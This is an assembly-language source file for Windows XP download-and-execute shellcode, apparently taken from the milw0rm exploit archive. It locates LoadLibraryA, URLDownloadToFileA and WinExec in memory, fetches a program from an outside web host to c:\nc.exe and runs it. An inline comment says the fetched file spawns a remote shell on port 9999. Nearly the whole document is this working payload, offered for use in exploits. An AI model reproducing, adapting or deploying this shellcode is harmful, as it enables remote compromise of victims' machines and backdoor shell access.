; Nice theorhetically generic url download and execute
; shellcode for Windows XP.
;
; Heck, atleast it saves you using tftp!
;
; Peter4020@hotmail.com
;
; nasmw -s -fbin -o download.s download.asm

bits 32

start:
jmp short avoidnastynulls

continue:
pop edi				; edi = 'urlmon.dll'
mov esi, edi
mov al, 0ffh
repne scasb
inc byte [edi-01h]		; edi = string of url
mov ebx, edi
mov al, 0ffh
repne scasb
inc byte [edi-01h]		; edi = path of download
mov edx, edi
repne scasb
inc byte [edi-01h]
push edx

push ebx
push edx
push esi

mov ebx, 0c25b5effh
mov ecx, 0deadc0deh
mov edi, 77e60101h

trawlmem:
inc edi
mov al, 0ffh
repne scasb
jmp short checkbytes
nop

checkbytes:
dec edi
push dword [edi]
pop esi
cmp ebx, esi
je short gotcha
jmp short trawlmem

jmp short pastpoint

avoidnastynulls:
jmp short data

pastpoint:

gotcha:
lea eax, [edi-2eh]		; get to start of loadlibrarya function
call eax			; call loadlibrarya

pop edx
pop ebx

push edx
xor ecx, ecx
push ecx
push ecx
push edx			; path of download
push ebx			; url of download
push ecx

mov ebx, 8d8d5602h
mov ecx, 0badc0dedh
mov edi, eax			; eax = base of urlmon.dll

trawlmem2:
inc edi
mov al, 002h
repne scasb
jmp short checkbytes2
nop

checkbytes2:
dec edi
push dword [edi]
pop esi
cmp ebx, esi
je short gotcha2
jmp short trawlmem2

gotcha2:
lea eax, [edi-1bh]		; get to start of urldownloadtofilea function
call eax			; call urldownloadtofilea

pop edx
xor ecx, ecx
;inc ecx
push ecx
push edx

mov ebx, 0c458b66h
mov ecx, 1337f00dh
mov edi, 77e60101h

trawlmem3:
inc edi
mov al, 066h
repne scasb
jmp short checkbytes3
nop

checkbytes3:
dec edi
push dword [edi]
pop esi
cmp ebx, esi
je short gotcha3
jmp short trawlmem3

gotcha3:
lea eax, [edi-16h]		; get to start of winexec function
call eax			; call winexec

mov ecx, 0deadc0deh
infloop:			; infinite loop; no crash when done
inc ecx
cmp ecx, 0badc0dedh
loopnz infloop			; if this slows you down too much, remove it!

int 3h

data:
call continue
db 'URLMON.DLL', 0ffh
db 'http://www.elitehaven.net/ncat.exe', 0ffh	; the file at this address spawns remote shell on port 9999
db 'c:\nc.exe', 0ffh

; milw0rm.com [2004-09-26]